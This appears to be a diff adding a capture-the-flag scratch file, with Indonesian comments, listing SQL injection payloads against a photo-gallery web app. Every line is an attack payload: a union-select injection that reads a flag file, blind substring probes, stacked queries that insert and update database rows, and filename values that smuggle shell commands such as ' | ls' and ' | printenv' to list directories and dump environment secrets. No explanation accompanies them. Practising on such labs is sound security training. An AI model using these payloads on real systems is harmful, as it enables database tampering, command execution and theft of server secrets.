@@ -1,0 +1,15 @@
+http://35.227.24.107/c917d1d041/fetch?id=0%20union%20select%20%22%27%20%%20%27flag%27,%20%27r%27).read()#%22
+0 union select "' % 'flag', 'r').read()#"
+0 union select "main.py" from photos where id = 3 and substring(photos.filename,1,1) = "^"
+0 union select "main.py" from photos where substring((select filename from photos where id = 3),1,1) = substring((select filename from photos where id = 3),1,1)
+0 union select "main.py"; update photos set title="cat" where id=1;
+0; insert into photos (id, filename, parent, title) values (61, "purrfect.jpg", 2, "CATTT"); commit;
+
+// Cari flag
+0; insert into albums (id, title) values (3, "CARI FLAG"); commit;
+0; insert into photos (id, title, filename, parent) values (71, "FLAG!", " | ls",3); commit;
+0; update photos set filename=" | ls files/ " where id = 71; commit;
+0; update photos set filename=" | ls files/ | tr '\n' ' ' " where id = 71; commit;
+0; update photos set filename=" | ls | tr '\n' ' ' " where id = 71; commit;
+0; update photos set filename=" | ls ../ | tr '\n' ' ' " where id = 71; commit;
+0; update photos set filename=" | printenv | tr '\n' ' ' " where id = 71; commit; // DAPET 3 FLAG DONG wkwkwk
